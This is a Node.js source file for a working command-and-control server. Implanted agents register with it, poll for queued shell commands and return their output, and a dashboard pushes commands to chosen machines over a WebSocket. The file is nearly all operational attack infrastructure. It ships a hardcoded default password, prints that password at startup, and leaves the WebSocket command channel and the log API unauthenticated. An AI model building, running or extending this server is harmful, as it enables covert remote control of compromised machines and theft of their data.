const express = require('express');
const http    = require('http');
const WebSocket = require('ws');
const crypto  = require('crypto');
const path    = require('path');

const app    = express();
const server = http.createServer(app);
const wss    = new WebSocket.Server({ server });

app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// ── STATE ──────────────────────────────────────────
const agents     = new Map();   // id → agent object
const dashboards = new Set();   // dashboard WebSocket connections
const PASS       = process.env.DASH_PASS || 'admin1234';

// ── HELPERS ────────────────────────────────────────
function broadcast(msg) {
  const s = JSON.stringify(msg);
  for (const ws of dashboards)
    if (ws.readyState === WebSocket.OPEN) ws.send(s);
}

function agentMeta(a) {
  return {
    id:          a.id,
    info:        a.info,
    connectedAt: a.connectedAt,
    lastSeen:    a.lastSeen,
    idle:        Math.round((Date.now() - a.lastSeen) / 1000),
    logCount:    a.logs.length,
    queueLen:    a.queue.length,
  };
}

// ── AGENT HTTP API ─────────────────────────────────

// Agent registers
app.post('/agent/hello', (req, res) => {
  const id = crypto.randomBytes(4).toString('hex').toUpperCase();
  agents.set(id, {
    id,
    info:        req.body || {},
    connectedAt: Date.now(),
    lastSeen:    Date.now(),
    logs:        [],
    queue:       [],
  });
  broadcast({ type: 'connected', agent: agentMeta(agents.get(id)) });
  console.log(`[+] ${id} registered — ${JSON.stringify(req.body?.platform || '')}`);
  res.json({ id });
});

// Agent polls for commands
app.post('/agent/beacon/:id', (req, res) => {
  const a = agents.get(req.params.id);
  if (!a) return res.status(404).json({ error: 'unknown agent' });
  a.lastSeen = Date.now();
  broadcast({ type: 'heartbeat', agentId: a.id, ts: a.lastSeen });
  const cmd = a.queue.shift();
  res.json(cmd || { type: 'noop' });
});

// Agent submits result
app.post('/agent/result/:id', (req, res) => {
  const a = agents.get(req.params.id);
  if (!a) return res.status(404).json({ error: 'unknown agent' });
  const entry = { ...req.body, ts: new Date().toISOString() };
  a.logs.push(entry);
  broadcast({ type: 'result', agentId: a.id, data: entry });
  res.json({ ok: true });
});

// ── DASHBOARD WEBSOCKET ────────────────────────────
wss.on('connection', (ws, req) => {
  dashboards.add(ws);

  // Send current state on connect
  ws.send(JSON.stringify({
    type:   'init',
    agents: [...agents.values()].map(agentMeta),
  }));

  ws.on('message', raw => {
    try {
      const msg = JSON.parse(raw);
      if (msg.type === 'exec') {
        const a = agents.get(msg.agentId);
        if (!a) return ws.send(JSON.stringify({ type: 'error', msg: 'agent not found' }));
        const cmdId = crypto.randomBytes(3).toString('hex');
        a.queue.push({
          type:   msg.cmdType || 'shell',
          args:   msg.args || {},
          cmd_id: cmdId,
        });
      }
    } catch {}
  });

  ws.on('close',  () => dashboards.delete(ws));
  ws.on('error',  () => dashboards.delete(ws));
});

// ── REST API ───────────────────────────────────────
app.post('/api/login', (req, res) => {
  res.json({ ok: req.body?.password === PASS });
});

app.get('/api/agents', (req, res) => {
  res.json([...agents.values()].map(agentMeta));
});

app.get('/api/agents/:id/logs', (req, res) => {
  const a = agents.get(req.params.id);
  res.json(a ? a.logs : []);
});

// ── DEAD AGENT CLEANUP ─────────────────────────────
setInterval(() => {
  const now = Date.now();
  for (const [id, a] of agents) {
    if (now - a.lastSeen > 30000) {
      agents.delete(id);
      broadcast({ type: 'disconnected', agentId: id });
      console.log(`[-] ${id} timed out`);
    }
  }
}, 10000);

// ── START ──────────────────────────────────────────
const PORT = process.env.PORT || 3000;
server.listen(PORT, () =>
  console.log(`[C2] ⚡ running on :${PORT}  |  pass: ${PASS}`)
);
